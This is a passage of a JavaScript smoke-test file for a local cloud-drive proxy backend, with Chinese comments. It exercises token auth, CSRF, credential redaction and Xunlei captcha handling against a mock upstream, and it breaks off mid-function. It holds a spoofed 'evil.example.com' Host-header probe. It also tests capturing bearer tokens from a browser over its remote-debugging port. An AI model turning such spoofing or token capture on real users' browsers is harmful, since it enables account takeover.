/* backend v0.1.0-next 冒烟测试（不依赖 wrangler 的链路部分） */
import { execSync, spawn } from 'node:child_process';
import http from 'node:http';
import { existsSync, readFileSync, rmSync, mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';

const BACKEND = new URL('../', import.meta.url).pathname;
const DATA = join(BACKEND, 'data');

let pass = 0;
let fail = 0;
const check = (name, cond, extra = '') => {
  if (cond) { pass += 1; console.log(`  ✅ ${name}`); }
  else { fail += 1; console.log(`  ❌ ${name} ${extra}`); }
};

// 清空旧数据（隔离测试环境）
rmSync(DATA, { recursive: true, force: true });

// v1.4：迅雷 captcha init 的本地 mock 上游（**绝不打真上游**）——backend 用 env 覆盖基址
const mockHits = [];
const mockSrv = http.createServer((mq, mres) => {
  let b = '';
  mq.on('data', (c) => { b += c; });
  mq.on('end', () => {
    mockHits.push({ url: mq.url, method: mq.method, headers: mq.headers, body: b });
    const json = (obj) => { mres.writeHead(200, { 'content-type': 'application/json' }); mres.end(JSON.stringify(obj)); };
    const u = String(mq.url ?? '');
    if (u.includes('/v1/shield/captcha/init')) return json({ captcha_token: `mock-token-${mockHits.length}`, expires_in: 300 });
    if (u.includes('/drive/v1/settings')) return json({});
    if (u.includes('/drive/v1/share/restore')) return json({ share_status: 'OK', params: { trace_file_ids: JSON.stringify({ s1: 'my1', s2: 'my2' }) } });
    if (mq.method === 'PATCH' && u.includes('/drive/v1/files/')) return json({ id: 'x', name: 'renamed.007' });
    if (u.includes('/drive/v1/files/zipped')) return json({ id: 'zipped', mime_type: 'application/zip', size: '10', links: {} });
    if (u.includes('/drive/v1/files/')) {
      return json({
        id: 'my1', name: 'a.pdf', size: '10', mime_type: 'application/pdf',
        links: { 'application/pdf': { url: 'https://dl/mock?e=1800000000', token: 'JWTTOKEN', expire: '2026-10-03T20:00:00+08:00', token_type: 'TOKEN_TYPE_ACCELERATION' } },
        web_content_link: 'https://wc/mock', params: { device_id: 'dev-mock', share_id: 'S', task_id: 't' }, vip: 'FREE', hash: 'h', md5_checksum: '',
      });
    }
    return json({});
  });
});
await new Promise((r) => mockSrv.listen(0, '127.0.0.1', r));
const mockPort = mockSrv.address().port;

// 启动 backend（固定端口 + 关 autoSpawn 避免拉起 wrangler）
const port = 18881;
const child = spawn(process.execPath, ['src/index.js', '--port', String(port)], {
  cwd: BACKEND,
  env: { ...process.env, PANHUB_NO_SPAWN: '1', PANHUB_XUNLEI_CAPTCHA_BASE: `http://127.0.0.1:${mockPort}`, PANHUB_XUNLEI_API_BASE: `http://127.0.0.1:${mockPort}`, PANHUB_XUNLEI_CDP_STUB_FILE: join(BACKEND, 'data', 'tmp', 'xunlei-cdp-stub.json') },
  stdio: ['ignore', 'pipe', 'pipe'],
});
let out = '';
child.stdout.on('data', (b) => { out += b.toString(); });
child.stderr.on('data', (b) => { out += b.toString(); });

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const base = `http://127.0.0.1:${port}`;

// 等 config 生成
let cfg;
for (let i = 0; i < 40; i++) {
  await sleep(250);
  const p = join(BACKEND, 'data', 'period', 'config.json');
  if (existsSync(p)) { cfg = JSON.parse(readFileSync(p, 'utf8')); break; }
}
check('首启生成 config.json + 令牌', Boolean(cfg?.proxy?.token && cfg?.webui?.token));
const webuiToken = cfg.webui.token;
const proxyToken = cfg.proxy.token;

// 等 listener 就绪
let ready = false;
for (let i = 0; i < 40; i++) {
  try {
    const r = await fetch(`${base}/api/proxy-config`);
    if (r.ok) { ready = true; break; }
  } catch { /* retry */ }
  await sleep(250);
}
check('单 listener 启动（/api/proxy-config 可达）', ready);

// ① proxy-config 判定已初始化（v1.2.2 §4 收紧：Host 白名单 + 不再下发 token）
const pc = await (await fetch(`${base}/api/proxy-config`)).json();
check('proxy-config ok=true 且不再下发 token', pc.ok === true && pc.token === undefined && pc.version === '0.1.0-next' && pc.proxyUrl === base, JSON.stringify(pc));

// ② hop：无令牌 → 401（CORS 头应存在）
let r = await fetch(`${base}/api/proxy`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'https://example.com/', method: 'GET' }) });
check('hop 无令牌 → 401 + CORS *', r.status === 401 && r.headers.get('access-control-allow-origin') === '*');

// ③ hop：正确令牌但 wrangler 未跑 → 502（说明转发目标指向 wrangler）
r = await fetch(`${base}/api/proxy`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ url: 'https://example.com/', method: 'GET' }) });
const b502 = await r.json();
check('hop 令牌通过但 wrangler 未启动 → 502 且文案提示', r.status === 502 && /wrangler/.test(b502.message ?? ''), b502.message);

// ④ webui 鉴权四件套：无令牌 → 401
r = await fetch(`${base}/api/web/info`);
check('webui 无令牌 → 401', r.status === 401);

// ⑤ 错误 Host → 403（fetch 禁改 Host 头，用原生 http 验证）
const badHostStatus = await new Promise((resolve) => {
  const req = http.request({ host: '127.0.0.1', port, path: '/api/web/info', method: 'GET', headers: { host: 'evil.example.com', 'x-webui-token': webuiToken } }, (res) => {
    res.resume();
    resolve(res.statusCode);
  });
  req.on('error', () => resolve(0));
  req.end();
});
check('webui 错误 Host → 403', badHostStatus === 403, `status=${badHostStatus}`);

// ⑥ 登录拿 CSRF
const s = await (await fetch(`${base}/api/web/auth/session`, { headers: { 'x-webui-token': webuiToken } })).json();
check('session 返回 CSRF', Boolean(s.csrf));
const csrf = s.csrf;

// ⑦ info 版本 0.1.0-next
const info = await (await fetch(`${base}/api/web/info`, { headers: { 'x-webui-token': webuiToken } })).json();
check('info.version = 0.1.0-next + wrangler health 字段', info.version === '0.1.0-next' && info.wrangler !== undefined, info.version);

// ⑧ 账号池：加 quark 正式账号（需 CSRF）
r = await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, pan: 'quark', label: '测试1号', cookieString: '__pus=a; __uid=b; __puus=c' }),
});
const acc = await r.json();
check('新增 quark 账号', r.ok && acc.ok, JSON.stringify(acc));

// ⑨ guest 账号：空 cookie → 自动生成随机 __pugs + guest# 打标
r = await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, pan: 'uc', kind: 'guest', cookieString: '' }),
});
const gacc = await r.json();
check('新增 guest 账号（空 cookie 自动生成）', r.ok && gacc.ok, JSON.stringify(gacc));
const accList = await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json();
const guestRow = accList.accounts.find((a) => a.kind === 'guest');
check('guest 账号 label 打标 guest#', Boolean(guestRow && /^guest#/.test(guestRow.label)), JSON.stringify(guestRow));

// ⑨.5 v1.3.1 读写分离：读接口不出凭据/指纹；写删必须二次令牌；临时写入可按时到期
const listRow = accList.accounts.find((a) => a.pan === 'quark' && a.kind === 'real');
check(
  '账号读接口无凭据与指纹字段（读写分离）',
  Boolean(listRow) && listRow.cookieTail === undefined && listRow.cookieLength === undefined && listRow.keys === undefined && 'userId' in listRow,
  JSON.stringify(listRow),
);
const noConfirm = await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ pan: 'uc', kind: 'guest', cookieString: '' }),
});
check('账号写入缺二次令牌 → 403', noConfirm.status === 403, `status=${noConfirm.status}`);
const detailRes = await (await fetch(`${base}/api/web/accounts/${listRow.id}`, { headers: { 'x-webui-token': webuiToken } })).json();
check('编辑接口不回填凭据（写新不读旧）', detailRes.credentialRefillable === false && detailRes.account.cookieString === undefined, JSON.stringify(detailRes).slice(0, 160));
const refreshRes = await fetch(`${base}/api/web/accounts/refresh`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({}),
});
check('账号快照可手动刷新', refreshRes.ok, `status=${refreshRes.status}`);
r = await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, pan: 'uc', kind: 'real', cookieString: '__pugs='.padEnd(208, 'x'), temp: true, ttlMinutes: 45 }),
});
const tempAdd = await r.json();
const tempList = await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json();
const tempRow = tempList.accounts.find((a) => a.id === tempAdd.id);
check('临时写入：记录 ttl 到期时间且标记 isTemp', r.ok && tempRow?.isTemp === true && tempRow.tempExpiresAt > Date.now(), JSON.stringify(tempRow));
const delNoConfirm = await fetch(`${base}/api/web/accounts/${tempAdd.id}`, {
  method: 'DELETE',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({}),
});
check('删除缺二次令牌 → 403', delNoConfirm.status === 403, `status=${delNoConfirm.status}`);

// ⑨.9 v1.3.1 P4：凭据刷新预设（手动触发 + 限频 + 无浏览器安全降级）
const pluginsRes = await fetch(`${base}/api/web/plugins`, { headers: { 'x-webui-token': webuiToken } });
const plugins = await pluginsRes.json();
check('插件页接口存在且列出预设（旧版该端点缺失 → 页面卡加载中）', pluginsRes.ok && Array.isArray(plugins.plugins) && plugins.plugins.length >= 3, JSON.stringify(plugins).slice(0, 200));
check('预设列出时不含任何凭据字段', plugins.plugins.every((p) => !('cookieString' in p) && !('credential' in p)), JSON.stringify(plugins.plugins[0]));
check('浏览器 health 回报（测试环境无浏览器 → 未连接）', plugins.browser?.ok === false && typeof plugins.browser?.reason === 'string', JSON.stringify(plugins.browser));
const runNoConfirm = await fetch(`${base}/api/web/plugins/alipan-auth-refresh/run`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({}),
});
check('运行预设缺二次令牌 → 403', runNoConfirm.status === 403, `status=${runNoConfirm.status}`);
const runRes = await fetch(`${base}/api/web/plugins/alipan-auth-refresh/run`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken }),
});
const runBody = await runRes.json();
check('无浏览器时安全降级（明确提示，不抛错）', runRes.status === 429 && /浏览器未连接/.test(runBody.message ?? ''), JSON.stringify(runBody).slice(0, 200));
const runAgain = await fetch(`${base}/api/web/plugins/alipan-auth-refresh/run`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken }),
});
const againBody = await runAgain.json();
check('预设限频生效（连点第二次被挡）', /限频/.test(againBody.message ?? ''), JSON.stringify(againBody).slice(0, 160));

// ⑩ hosts：新增允许
r = await fetch(`${base}/api/web/hosts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ host: 'drive.quark.cn', pan: 'quark' }),
});
check('hosts 新增映射', r.ok);
// ⑨ v1.3.1 四类路由：credential-pick（取号）+ 身份查询（只回非敏感身份）
check('credential-pick/accounts 无令牌 → 401', (await fetch(`${base}/api/credential-pick/accounts`)).status === 401);
const identRes = await fetch(`${base}/api/credential-pick/accounts`, { headers: { 'x-proxy-token': proxyToken } });
const ident = await identRes.json();
check('credential-pick/accounts 只回非敏感身份', identRes.ok && Array.isArray(ident.accounts) && ident.accounts.every((x) => typeof x === 'string' && x.length < 64 && !/__pus|__pugs|Bearer/.test(x)), JSON.stringify(ident));
const pickRes = await fetch(`${base}/api/credential-pick`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ pan: 'quark', operation: 'download' }) });
const pick = await pickRes.json();
check('credential-pick（新词表 download）命中账号', pickRes.ok && typeof pick.tag === 'string' && Boolean(pick.kind), JSON.stringify({ status: pickRes.status, tag: pick.tag, kind: pick.kind }));
const legacyRes = await fetch(`${base}/api/proxy/cookie-pick`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ pan: 'quark', operation: 'prase' }) });
check('旧路径 /api/proxy/cookie-pick 兼容（legacy operation=prase）', legacyRes.ok);
const noAccRes = await fetch(`${base}/api/credential-pick`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ pan: 'nosuchpan', operation: 'download' }) });
check('credential-pick 无可用账号 → 404', noAccRes.status === 404);
r = await fetch(`${base}/api/web/hosts`, { headers: { 'x-webui-token': webuiToken } });
const hosts = await r.json();
check('hosts list 包含新增', hosts.hosts?.some((h) => h.host === 'drive.quark.cn'));

// ⑩.5 v1.4 迅雷 captcha_token 端点（X-Proxy-Token）+ sign 设置（上游走本地 mock，不打真机）
check('xunlei hosts 种子映射（api-pan/xluser-ssl → xunlei）', hosts.hosts?.some((h) => h.host === 'api-pan.xunlei.com' && h.pan === 'xunlei') && hosts.hosts?.some((h) => h.host === 'xluser-ssl.xunlei.com' && h.pan === 'xunlei'), JSON.stringify(hosts.hosts));

const xlNoToken = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'post:/drive/v1/share/restore' }) });
check('xunlei captcha-token 无令牌 → 401', xlNoToken.status === 401, `status=${xlNoToken.status}`);

const xlBadAction = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ action: 'not-an-action' }) });
check('xunlei captcha-token 非法 action → 400', xlBadAction.status === 400, `status=${xlBadAction.status}`);

const xlUnconfigured = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ action: 'post:/drive/v1/share/restore' }) });
const xlUncfgBody = await xlUnconfigured.json();
check('未配 sign → 400 + 中文明确错误（不静默）', xlUnconfigured.status === 400 && xlUncfgBody.error === 'XUNLEI_NOT_CONFIGURED' && /captcha_sign/.test(xlUncfgBody.message ?? ''), JSON.stringify(xlUncfgBody));
check('未配 sign 时未打上游（mock 零请求）', mockHits.length === 0, `mockHits=${mockHits.length}`);
check('未配 sign 时不回传 sign / device_id', xlUncfgBody.captcha_sign === undefined && xlUncfgBody.device_id === undefined, JSON.stringify(xlUncfgBody));

// 录入假 sign（测试只断言请求形状/降级，不打真上游）
const fakeDevice = 'a'.repeat(32);
r = await fetch(`${base}/api/web/settings`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ xunlei: { captcha_sign: '1.fakesign', captcha_timestamp: '1700000000000', device_id: fakeDevice } }),
});
check('迅雷 captcha 设置写入', r.ok, `status=${r.status}`);
const xlSettings = await (await fetch(`${base}/api/web/settings`, { headers: { 'x-webui-token': webuiToken } })).json();
check('settings 回 xunlei 脱敏视图（有 sign 但不回明文）', xlSettings.xunlei?.captchaSignSet === true && !JSON.stringify(xlSettings.xunlei).includes('1.fakesign'), JSON.stringify(xlSettings.xunlei));

const xlOk = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ action: 'post:/drive/v1/share/restore' }) });
const xlOkBody = await xlOk.json();
check('配 sign 后拿到 token（fresh）', xlOk.ok && xlOkBody.captcha_token === 'mock-token-1' && xlOkBody.cached === false, JSON.stringify(xlOkBody));
check('响应只含 token 三件套（sign/device_id 永不出接口）', !('captcha_sign' in xlOkBody) && !('device_id' in xlOkBody) && xlOkBody.expires_in === 300, JSON.stringify(xlOkBody));
check('上游请求形状：captcha/init + 手动录入的 sign/timestamp/device 原样使用', mockHits.length === 1 && mockHits[0].url === '/v1/shield/captcha/init' && mockHits[0].method === 'POST' && (() => { const b = JSON.parse(mockHits[0].body); return b.action === 'post:/drive/v1/share/restore' && b.device_id === fakeDevice && b.meta?.captcha_sign === '1.fakesign' && b.meta?.timestamp === '1700000000000' && b.meta?.package_name === 'pan.xunlei.com' && b.meta?.client_version === '1.93.6'; })(), JSON.stringify(mockHits[0]).slice(0, 300));

const xlCached = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ action: 'post:/drive/v1/share/restore' }) });
const xlCachedBody = await xlCached.json();
check('同 action 二次请求命中缓存（不发上游）', xlCached.ok && xlCachedBody.cached === true && mockHits.length === 1, JSON.stringify(xlCachedBody));

const xlOther = await fetch(`${base}/api/xunlei/captcha-token`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ action: 'get:/drive/v1/files' }) });
const xlOtherBody = await xlOther.json();
check('不同 action 不共享缓存（重新 init）', xlOther.ok && xlOtherBody.cached === false && mockHits.length === 2, JSON.stringify(xlOtherBody));

// ⑩.7 v1.4 迅雷账号相关 ops（/api/xunlei/op；全部打本地 mock，不动真上游）
const xlOpNoToken = await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ op: 'download', fid: 's1' }) });
check('xunlei op 无令牌 → 401', xlOpNoToken.status === 401, `status=${xlOpNoToken.status}`);
const xlOpBad = await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'nope' }) });
check('xunlei op 非法 op → 400', xlOpBad.status === 400, `status=${xlOpBad.status}`);
const xlOpNoAcc = await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'download', fid: 's1' }) });
const xlNoAccBody = await xlOpNoAcc.json();
check('未配账号 → 明确 NO_ACCOUNT（中文指引，不静默）', xlOpNoAcc.status === 200 && xlNoAccBody.ok === false && xlNoAccBody.code === 'NO_ACCOUNT' && /README|后台/.test(xlNoAccBody.message ?? ''), JSON.stringify(xlNoAccBody));
check('未配账号时不打上游（mock 无 /drive 命中）', !mockHits.some((h) => h.url.includes('/drive/')), JSON.stringify(mockHits.map((h) => h.url)));

// 配置托管账号（authorization + to_parent_id）
r = await fetch(`${base}/api/web/settings`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf }, body: JSON.stringify({ xunlei: { authorization: 'Bearer FAKE-AUTH', to_parent_id: 'parent-1', user_id: '42' } }) });
check('迅雷托管账号设置写入', r.ok, `status=${r.status}`);
const xlView = await (await fetch(`${base}/api/web/settings`, { headers: { 'x-webui-token': webuiToken } })).json();
check('settings 回 xunlei 托管账号（authorization 只回是否配置，不回明文）', xlView.xunlei?.authorizationSet === true && !JSON.stringify(xlView.xunlei).includes('FAKE-AUTH'), JSON.stringify(xlView.xunlei));

const opSettings = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'settings' }) })).json();
check('op settings → ok', opSettings.ok === true, JSON.stringify(opSettings));

const opDl = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'download', fid: 's1' }) })).json();
check('op download → 直链 + expiresAt（links[].expire ISO→ms）+ 脱敏详情', opDl.ok === true && /dl\/mock/.test(opDl.url ?? '') && opDl.expiresAt === Date.parse('2026-10-03T20:00:00+08:00') && opDl.detail?.links?.['application/pdf']?.hasUrl === true && Boolean(opDl.detail?.params?.device_id) && !/dev-mock/.test(JSON.stringify(opDl.detail)), JSON.stringify(opDl).slice(0, 260));

const opZip = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'download', fid: 'zipped' }) })).json();
check('压缩类无直链 → NEED_RENAME', opZip.ok === false && opZip.code === 'NEED_RENAME', JSON.stringify(opZip));

const opRename = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'rename', fid: 'my1', name: 'a.zip' }) })).json();
const patchHit = mockHits.find((h) => h.method === 'PATCH' && h.url.includes('/drive/v1/files/'));
check('op rename → PATCH /drive/v1/files/{id} + 3 位补零随机后缀', opRename.ok === true && Boolean(patchHit) && /"name":"a\.zip\.\d{3}"/.test(patchHit.body), JSON.stringify({ opRename, body: patchHit?.body }));

const opRestore = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'restore', share_id: 'S1', pass_code_token: 'st', fids: ['s1', 's2'] }) })).json();
check('op restore → trace_file_ids 映射', opRestore.ok === true && opRestore.results?.length === 2 && opRestore.results[0].fileId === 'my1', JSON.stringify(opRestore));

const bizHit = mockHits.filter((h) => h.url.includes('/drive/') && h.headers['x-captcha-token']).pop();
check('上游业务请求带 backend 自己的 device/captcha/authorization', Boolean(bizHit) && bizHit.headers['x-device-id'] === fakeDevice && bizHit.headers['authorization'] === 'Bearer FAKE-AUTH' && Boolean(bizHit.headers['x-captcha-token']), JSON.stringify(bizHit && { dev: bizHit.headers['x-device-id'], auth: bizHit.headers['authorization'], act: bizHit.url }));

// ⑩.8 v1.4：取链参数 usage（CONSUME/PLAY）透传到上游 query（白名单外回落 CONSUME）
const opPlay = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'download', fid: 's1', usage: 'PLAY' }) })).json();
const playHit = mockHits.filter((h) => h.url.includes('/drive/v1/files/')).pop();
check('op download usage=PLAY → 上游 query usage=PLAY', opPlay.ok === true && /usage=PLAY/.test(playHit?.url ?? ''), playHit?.url);
const opBadUsage = await (await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'download', fid: 's1', usage: 'WEIRD' }) })).json();
const badHit = mockHits.filter((h) => h.url.includes('/drive/v1/files/')).pop();
check('非法 usage 回落 CONSUME', opBadUsage.ok === true && /usage=CONSUME/.test(badHit?.url ?? ''), badHit?.url);

// ⑩.9 v1.4：op 探活 ping（SPA 解析前先探端点）——200 + {ok:true}，且不碰上游
const hitsBeforePing = mockHits.length;
const pingRes = await fetch(`${base}/api/xunlei/op`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ op: 'ping' }) });
const pingBody = await pingRes.json();
check('op ping → 200 {ok:true}', pingRes.status === 200 && pingBody.ok === true, JSON.stringify(pingBody));
check('op ping 不打上游（mock 零新增）', mockHits.length === hitsBeforePing, `+${mockHits.length - hitsBeforePing}`);

// ⑩.95 v1.4 迅雷凭据：CDP 抓取（stub 文件驱动，不依赖真浏览器）
const stubPath = join(BACKEND, 'data', 'tmp', 'xunlei-cdp-stub.json');
const jwtPayload = Buffer.from(JSON.stringify({ sub: '1367069689', exp: Math.floor(Date.now() / 1000) + 3600 })).toString('base64url');
const fakeAuth = `Bearer ${Buffer.from('{"alg":"none"}').toString('base64url')}.${jwtPayload}.sig`;
const writeStub = (obj) => { mkdirSync(dirname(stubPath), { recursive: true }); writeFileSync(stubPath, JSON.stringify(obj)); };
const capReq = (confirm) => fetch(`${base}/api/xunlei/credential/cdp`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify(confirm ? { confirmToken: webuiToken } : {}),
});

check('迅雷凭据 status 无令牌 → 401', (await fetch(`${base}/api/xunlei/credential/status`)).status === 401);
const capNoConfirm = await capReq(false);
check('迅雷凭据抓取缺二次令牌 → 403', capNoConfirm.status === 403, `status=${capNoConfirm.status}`);

writeStub({ error: 'connect-failed' });
let capRes = await capReq(true);
let capBody = await capRes.json();
check('CDP 不可用 → 503 + 中文指引', capRes.status === 503 && capBody.error === 'CDP_UNAVAILABLE' && /remote-debugging-port/.test(capBody.message ?? ''), JSON.stringify(capBody));

writeStub({ requests: [{ url: 'https://pan.xunlei.com/static/app.js', headers: {} }] });
capRes = await capReq(true);
capBody = await capRes.json();
check('未登录（无 authorization 请求）→ 409 NOT_LOGGED_IN + 指引', capRes.status === 409 && capBody.error === 'NOT_LOGGED_IN' && /登录/.test(capBody.message ?? ''), JSON.stringify(capBody));

// fakeAuth 已在前面定义（⑩.98 绑定锁断言用同一个假 JWT）
writeStub({
  requests: [
    { url: 'https://api-pan.xunlei.com/drive/v1/files/abc?space=&usage=CONSUME', headers: { authorization: fakeAuth, 'x-device-id': '550cfe136e9d74e95be5393738639de7' } },
    { url: 'https://xluser-ssl.xunlei.com/v1/shield/captcha/init', headers: {}, postData: JSON.stringify({ device_id: '550cfe136e9d74e95be5393738639de7', meta: { package_name: 'pan.xunlei.com', client_version: '1.93.6', captcha_sign: '1.3221d0', timestamp: '1791371226120', user_id: '1367069689' } }) },
  ],
});
capRes = await capReq(true);
capBody = await capRes.json();
check('CDP 抓取成功 → 脱敏结果（userId + captcha 身份，响应体不含 Bearer）', capRes.status === 200 && capBody.ok === true && capBody.userId === '1367069689' && capBody.hasCaptchaSign === true && capBody.deviceId === '550cfe136e9d74e95be5393738639de7' && !/Bearer/.test(JSON.stringify(capBody)), JSON.stringify(capBody));

const xlStatus1 = await (await fetch(`${base}/api/xunlei/credential/status`, { headers: { 'x-webui-token': webuiToken } })).json();
check('status 脱敏（authorizationSet + userId，且无 authorization 明文）', xlStatus1.ok === true && xlStatus1.status?.authorizationSet === true && xlStatus1.status?.userId === '1367069689' && xlStatus1.status?.hasCaptchaSign === true && !/Bearer/.test(JSON.stringify(xlStatus1)), JSON.stringify(xlStatus1.status));

const accAfter = await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json();
const xlAcc = accAfter.accounts?.find((a) => a.pan === 'xunlei');
check('账号池出现 pan=xunlei 账号（label 带 userId）', Boolean(xlAcc) && /1367069689/.test(xlAcc.label ?? ''), JSON.stringify(xlAcc));

// ⑩.96 v1.4.1：pan 白名单（alipan）+ 删除账号成功路径
r = await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, pan: 'alipan', label: 'ali-test', cookieString: 'authorization=***;drive_id=d1;to_parent_file_id=p1' }),
});
const aliAdd = await r.json();
check('pan=alipan 添加账号不再报「未知网盘」（①）', r.ok && aliAdd.ok, JSON.stringify(aliAdd));

const tempForDelete = await (await fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, pan: 'uc', kind: 'guest', cookieString: '', label: 'del-me' }),
})).json();
const delOk = await fetch(`${base}/api/web/accounts/${tempForDelete.id}`, {
  method: 'DELETE',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken }),
});
const accAfterDel = await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json();
check('删除账号成功路径（⑤：DELETE body 里的二次令牌被解析）', delOk.status === 200 && !accAfterDel.accounts.some((a) => a.id === tempForDelete.id), `status=${delOk.status}`);

// ⑩.97 v1.4.1：智能写入（按键级临时 → 到期恢复旧值，③）
const postSettingsApi = (body) => fetch(`${base}/api/web/settings`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify(body),
});
const getSettingsApi = async () => (await (await fetch(`${base}/api/web/settings`, { headers: { 'x-webui-token': webuiToken } })).json());
await postSettingsApi({ xunlei: { user_id: 'old-777' } });
const st1 = await getSettingsApi();
check('长期写入生效（基准值 old-777）', st1.xunlei?.userId === 'old-777', JSON.stringify(st1.xunlei));
const smartRes = await (await postSettingsApi({ smart: { xunlei_user_id: { value: 'temp-888', ttlSeconds: 1 } } })).json();
check('智能写入（临时）返回 temp=true', smartRes.ok === true && smartRes.applied?.[0]?.temp === true, JSON.stringify(smartRes));
const st2 = await getSettingsApi();
check('临时值立即生效 + 出现在 tempKeys', st2.xunlei?.userId === 'temp-888' && (st2.tempKeys ?? []).some((t) => t.key === 'xunlei_user_id'), JSON.stringify({ userId: st2.xunlei?.userId, tempKeys: st2.tempKeys }));
await sleep(1300);
const st3 = await getSettingsApi();
check('临时到期 → **恢复旧值**（不是清空）', st3.xunlei?.userId === 'old-777' && (st3.tempKeys ?? []).length === 0, JSON.stringify({ userId: st3.xunlei?.userId, tempKeys: st3.tempKeys }));
await postSettingsApi({ smart: { xunlei_user_id: { value: 'long-999' } } });
const st4 = await getSettingsApi();
check('手动（长期）写入清掉临时记录', st4.xunlei?.userId === 'long-999' && (st4.tempKeys ?? []).length === 0, JSON.stringify({ userId: st4.xunlei?.userId, tempKeys: st4.tempKeys }));

// ⑩.98 v1.4.1：CDP port ↔ 账号绑定锁（④）
const capOnPort = (port, extra = {}) => fetch(`${base}/api/xunlei/credential/cdp`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
